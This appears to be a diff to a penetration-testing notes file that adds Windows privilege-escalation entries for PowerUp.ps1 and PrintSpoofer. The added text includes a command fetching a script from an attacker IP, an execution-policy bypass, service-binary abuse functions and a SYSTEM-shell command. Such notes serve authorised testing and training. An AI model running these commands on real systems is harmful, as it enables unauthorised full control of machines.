@@ -3331,3 +3331,38 @@ Seatbelt is a C# project that performs a number of security oriented host-survey
 ## [jaws](https://github.com/411Hall/JAWS)
 
 JAWS is PowerShell script designed to help penetration testers (and CTFers) quickly identify potential privilege escalation vectors on Windows systems. It is written using PowerShell 2.0 so 'should' run on every Windows version since Windows 7.
+
+
+## [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
+
+Tool to detect and exploit (through its *AbuseFunction*) privilege escalation vectors.
+
+Will need to download to computer and set PS's ExecutionPolicy to Bypass
+```powershell
+PS C:\Users\dave> iwr -uri http://<attacker IP>/PowerUp.ps1 -Outfile PowerUp.ps1
+
+PS C:\Users\dave> powershell -ep bypass
+
+PS C:\Users\dave> . .\PowerUp.ps1
+```
+
+| Command                   | Desc                                                                                                                                                |
+| ------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Get-ModifiableServiceFile | Displays services the current user can modify (such as service binary or config files)<br>                                                          |
+| Get-ModifiablePath        | Parses a passed string containing multiple possible file/folder paths and returns<br>the file paths where the current user has modification rights. |
+| Get-UnquotedService       | Returns the name and binary path for services with unquoted paths<br>that also have a space in the name.                                            |
+| Install-ServiceBinary     | Replaces the service binary for the specified service with one that executes<br>a specified command as SYSTEM                                       |
+| Write-ServiceBinary       | Patches in the specified command to a pre-compiled C# service executable and<br>writes the binary out to the specified ServicePath location.        |
+
+## [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
+
+Abuses _SeImpersonatePrivilege_ privilege by using a named pipe connection to elevate privs to NT AUTHORITY\\SYSTEM
+
+Usage
+```powershell
+PS C:\Users\dave> . .\PrintSpoofer64.exe -i -c powershell.exe
+```
+
+
+
+## [Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) family
